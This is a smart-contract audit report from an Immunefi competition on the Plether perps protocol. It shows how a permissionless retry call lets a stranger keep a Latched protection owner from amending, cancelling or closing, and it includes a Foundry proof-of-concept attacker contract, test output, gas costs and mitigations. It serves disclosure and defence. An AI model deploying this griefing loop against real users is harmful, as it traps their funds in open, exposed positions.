# \#98496 [SC-High] Permissionless `retryPositionProtectionClose` lets any third party keep a Latched protection owner from amending, cancelling or closing, because `amendLatchedPositionProtectionCloseLimits` needs `pendingOrderCounts(owner) == 0`

**Submitted on Nov 8th 2026 at 08:30:45 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98496
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

A TP/SL protection becomes `Latched` when its close attempt fails the owner's own close limits. This is normal operation. For example, the owner set a low `maxExplicitFeesAssets` or `maxActionChargeAssets` but the real fee turned out to be higher than they allowed. The owner's only way out is `amendLatchedPositionProtectionCloseLimits`, which reverts unless the owner has **zero** pending Router orders. But `retryPositionProtectionClose` is permissionless, and it appends a fresh close attempt for the owner. A third party can therefore call `expireOrder(oldAttempt)` and `retry` in **one tx**, so the owner's pending count is 1 at every tx boundary and the amend never works. The new attempt uses the owner's old limits, fails again, and relatches. The loop repeats.

The latch itself is documented. This report is about a stranger being able to keep the owner locked in it. The docs state the "no pending Router order" precondition for amend, but not that a third-party retry can defeat it.

### Plain Summary (how the bug is triggered, in short steps)

1. The owner (Raju) has a $400k LONG with a take-profit, and `maxExplicitFeesAssets = 1` (too tight). The keeper triggers the TP, the close attempt fails the limit, and the protection is `Latched`.
2. Raju wants to loosen the limit. `amendLatchedPositionProtectionCloseLimits` requires `pendingOrderCounts(Raju) == 0`.
3. The third party (Gabbar) calls one tx: `expireOrder(Raju's live attempt)` then `retryPositionProtectionClose(pid)`. Raju now has 1 pending order again, with the same failing limits.
4. Raju's amend, own retry, cancel and ordinary close all revert. Gabbar repeats every ~61 s.
5. Gabbar pays only gas (~929,717 gas per cycle). Raju's position stays open and exposed.

### Vulnerability Details

1. The amend requires an empty pending queue:

```solidity
// PositionProtectionBook.sol:315-327
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, CloseFinancialLimits calldata limits) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
@>  if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {   // :323
@>      revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
```

2. Anyone can create that pending order for the owner. Retry only checks Latched, the exact position and zero pending, and it keeps the owner's stored limits:

```solidity
// PositionProtectionBook.sol:382-406
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    ...
    if (protection.status != Latched) revert OrderRouter__ProtectionNotLatched();
    _requireMatchingPosition(protection);
    if (router.pendingOrderCounts(protection.account) != 0) revert OrderRouter__PendingOrdersExist();
@>  linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER).commitProtectionCloseAttempt(protectionId, protection.account, ...);  // no msg.sender check
```

3. The previous attempt is cleared by `OrderRouter.expireOrder` (`OrderRouter.sol:191`), also permissionless. Expired counts as a failed attempt that relatches the protection, so the loop continues.

4. The owner has no other exit while Latched:
   - `_cancel` accepts only `PendingOpen` / `Armed` (`PositionProtectionBook.sol:408-418`).
   - Own retry reverts on pending != 0 (`:392-394`).
   - Ordinary close commits are blocked while a protection is active (`router/OrderLiquidationBatchLogic.sol:313-315`, `OrderRouter__ProtectionActive`).

   Liquidation still works.

5. The docs state the precondition (`CANONICAL_ENTRYPOINTS.md:145-148`, `SECURITY.md:547-561`) and that retry is permissionless, but not that a third-party retry can keep it unmet.

### Impact Details

**Griefing: the attacker gains nothing, but the owner of a Latched protection loses control of their position and pledged margin for as long as the attacker keeps cycling.**

PoC numbers (below, real Router/engine, release risk params):

| | Value |
|---|---|
| Victim position | LONG 4,000 lots = $400,000, 20,000 USDG pledged |
| Griefer cost | 929,717 gas per cycle, 60 cycles = 1 hour |
| Griefer cost in USD | about $0.028 per cycle, $1.67 per hour, $40 per day (assumes Arbitrum 0.01 gwei, ETH $3,000, plus small L1 calldata) |
| Victim during the hour | amend, own retry, cancel, ordinary close: all revert at every tx boundary, position still open |
| Victim exposure per 1% adverse move | 4,000 USDG, which the owner cannot close out. This is market risk, not a transfer to the attacker |

### Mitigation

Any one of these closes it:

- Let the owner amend while the only pending order is the protection's own live attempt (re-price that attempt), or let the owner fail the live attempt and amend in one call.
- Restrict `retryPositionProtectionClose` to the owner for N blocks after a relatch.
- Do not let a third-party retry create a new attempt with the owner's old limits while the owner has a pending amend.

### References

- `packages/perps/src/PositionProtectionBook.sol:315-327` (amend), `:323-325` (pending != 0 check)
- `packages/perps/src/PositionProtectionBook.sol:382-406` (permissionless retry), `:392-394`
- `packages/perps/src/PositionProtectionBook.sol:408-418` (`_cancel` only PendingOpen/Armed)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:313-315` (ordinary commits blocked by active protection)
- `packages/perps/src/OrderRouter.sol:191` (`expireOrder`)
- `packages/perps/CANONICAL_ENTRYPOINTS.md:145-148`, `packages/perps/SECURITY.md:547-561` (documented precondition and permissionless retry)

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/poc/ProtectionRetryGrief.t.sol` and run `forge test --root packages/perps --match-path test/poc/ProtectionRetryGrief.t.sol -vv`. It extends the repo's `BasePerpTest` fixture (full stack, MockPyth for the out-of-scope oracle feed) and inlines every helper it needs.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {console2} from "forge-std/console2.sol";

interface IRouterExpire {
    function expireOrder(uint64) external returns (OrderV3Types.ExecutionResult memory);
    function pendingOrderCounts(address) external view returns (uint256);
}

/// @notice third party: in ONE tx expires the owner's current (unpaid) protection attempt and appends a fresh one.
contract LatchGriefer {

    function cycle(address router, address ppb, uint64 oldId, uint64 pid) external returns (uint64 newId, uint256 gasUsed) {
        uint256 g = gasleft();
        if (oldId != 0) IRouterExpire(router).expireOrder(oldId);
        newId = IPositionProtectionActions(ppb).retryPositionProtectionClose(pid);
        gasUsed = g - gasleft();
    }

}

/// @notice PoC: a permissionless `retryPositionProtectionClose` loop keeps the owner's Latched protection
///         un-amendable (`pendingOrderCounts(owner) == 0` required), so the owner cannot fix the limits, cancel,
///         or close the position while the third party keeps cycling. Release risk params (vpi 0.01, maxSkew 0.4,
///         maint 10 bps, init 20 bps, exec fee 4 bps), router minOpenNotional 1_000e6 / maxPendingOrders 5.
contract PoCProtectionRetryGrief is BasePerpTest {

    uint256 internal constant Q = 1e20; // 1 lot = 100 USD notional at price 1e8
    address internal constant KEEP = address(0xE0EC);
    address internal constant VIC = address(0x51C7); // the owner ("Raju")
    address internal constant HON = address(0x4011); // honest counter-side trader
    address internal constant GRIEF = address(0x6A8B); // third party ("Gabbar")

    IPositionProtectionActions internal ppbC;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 2_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = 1_000e6;
        rc.adverseConfidenceMultiplierBps = 2_500;
        rc.maxPendingOrders = 5;
        routerAdmin.proposeRouterConfig(rc);
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8_000;
        pool.proposePoolConfig(pc);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 1);
        router.updateMarkPrice(_fresh(1e8));
        pool.finalizePoolConfig();
        ppbC = IPositionProtectionActions(address(router.positionProtectionBook()));
    }

    // ------------------------------------------------------------ helpers
    function _fresh(uint256 price) internal returns (bytes[] memory data) {
        return _fresh(price, 0);
    }

    function _fresh(uint256 price, uint64 prev) internal returns (bytes[] memory data) {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(price)), 0, -8, uint64(vm.getBlockTimestamp()), prev);
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _to(uint256 t) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _open(address who, CfdTypes.Side side, uint256 lots, uint256 margin) internal {
        vm.prank(who);
        uint64 oid = router.commitOrder(side, lots * Q, margin, 0, false);
        for (uint256 i; i < 4; ++i) {
            (IOrderRouterAccounting.PendingOrderView memory pv,) = router.getPendingOrderView(oid);
            bytes[] memory d = _fresh(1e8, pv.commitTime);
            vm.prank(KEEP);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(oid, d);
            if (r.status != OrderV3Types.LifecycleStatus.Pending) return;
        }
        revert("open stuck");
    }

    function _batchAll(uint256 px) internal {
        uint64 last = router.nextCommitId() - 1;
        bytes[] memory d = _fresh(px);
        vm.prank(KEEP);
        try router.executeOrderBatch(last, d) {} catch {} // 2nd call may find nothing left to execute
    }

    function _size(address a) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    function _status(uint64 pid) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return IPositionProtectionViews(address(router.positionProtectionBook())).getPositionProtection(pid).status;
    }

    function _params(uint256 tp, uint256 maxExplicitFees)
        internal
        pure
        returns (PositionProtectionTypes.PositionProtectionParams memory p)
    {
        p.takeProfitTriggerPrice = tp;
        p.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: maxExplicitFees
        });
    }

    /// Owner opens 4,000 lots LONG ($400k) and arms a take-profit whose fee limit is too tight. Keeper triggers it,
    /// the close attempt fails the owner's own limit, and the protection becomes Latched (normal, documented flow).
    function _ownerLatched() internal returns (uint64 pid) {
        _fundTrader(VIC, 50_000e6);
        _fundTrader(HON, 1_000_000e6);
        _open(HON, CfdTypes.Side.SHORT, 3_000, 40_000e6);
        _open(VIC, CfdTypes.Side.LONG, 4_000, 20_000e6);
        router.updateMarkPrice(_fresh(1e8));
        vm.prank(VIC);
        pid = ppbC.createPositionProtection(_params(0.99e8, 1)); // limit: max explicit fees = 1 atom
        bytes[] memory d = _fresh(0.989e8);
        vm.prank(KEEP);
        ppbC.triggerPositionProtection(pid, d);
        _batchAll(0.989e8);
        _batchAll(0.989e8);
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
    }

    // ------------------------------------------------------------ canary: no third party -> owner can amend
    function test_canary_ownerAmendsWithoutGriefer() public {
        uint64 pid = _ownerLatched();
        vm.prank(VIC);
        ppbC.amendLatchedPositionProtectionCloseLimits(pid, _params(0, type(uint256).max).closeLimits);
        assertEq(IRouterExpire(address(router)).pendingOrderCounts(VIC), 0);
    }

    // ------------------------------------------------------------ the bug
    function test_PoC_thirdPartyRetryLoopBlocksOwnerAmend() public {
        uint64 pid = _ownerLatched();
        PositionProtectionTypes.CloseFinancialLimits memory fixedLimits = _params(0, type(uint256).max).closeLimits;

        LatchGriefer g = new LatchGriefer();
        uint64 cur;
        uint256 gasTotal;
        uint256 cycles = 60; // one cycle per 61 s -> one hour
        for (uint256 i; i < cycles; ++i) {
            uint256 used;
            vm.prank(GRIEF);
            (cur, used) = g.cycle(address(router), address(ppbC), cur, pid);
            gasTotal += used;

            // owner's next tx at every boundary: everything reverts
            vm.startPrank(VIC);
            try ppbC.amendLatchedPositionProtectionCloseLimits(pid, fixedLimits) {
                revert("amend succeeded");
            } catch {}
            try ppbC.retryPositionProtectionClose(pid) {
                revert("owner retry succeeded");
            } catch {}
            try ppbC.cancelPositionProtection(pid) {
                revert("cancel succeeded");
            } catch {}
            try router.commitOrder(CfdTypes.Side.LONG, 4_000 * Q, 0, 0, true) returns (uint64) {
                revert("ordinary close succeeded");
            } catch {}
            vm.stopPrank();
            assertEq(IRouterExpire(address(router)).pendingOrderCounts(VIC), 1, "pending count 1 at tx boundary");
            _to(vm.getBlockTimestamp() + 61);
        }
        assertEq(_size(VIC), 4_000 * Q, "position still open after 1 h");
        console2.log("cycles (1 per 61s)            ", cycles);
        console2.log("avg gas per griefer cycle     ", gasTotal / cycles);
        console2.log("exposure the owner cannot exit (USDG)", uint256(400_000));
        console2.log("loss per +1% adverse move (USDG)      ", uint256(4_000));

        // Owner escape (disclosed): execute the live attempt itself -> amend -> retry, with no griefer tx in between.
        bytes[] memory d = _fresh(1e8);
        vm.prank(VIC);
        router.executeOrder(cur, d);
        vm.prank(VIC);
        ppbC.amendLatchedPositionProtectionCloseLimits(pid, fixedLimits);
        vm.prank(VIC);
        ppbC.retryPositionProtectionClose(pid);
        _batchAll(1e8);
        _batchAll(1e8);
        console2.log("escape without griefer tx in between closed position:", _size(VIC) == 0);
    }

}
```

Result (actually run, `forge test --root packages/perps --match-path test/poc/ProtectionRetryGrief.t.sol -vv`):

```
Ran 2 tests for test/poc/ProtectionRetryGrief.t.sol:PoCProtectionRetryGrief
[PASS] test_PoC_thirdPartyRetryLoopBlocksOwnerAmend() (gas: 56202337)
Logs:
  cycles (1 per 61s)             60
  avg gas per griefer cycle      929717
  exposure the owner cannot exit (USDG) 400000
  loss per +1% adverse move (USDG)       4000
  escape without griefer tx in between closed position: true

[PASS] test_canary_ownerAmendsWithoutGriefer() (gas: 6406264)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

The canary shows the same amend succeeds when no third party cycles, so the revert in the main test comes from the retry loop. 

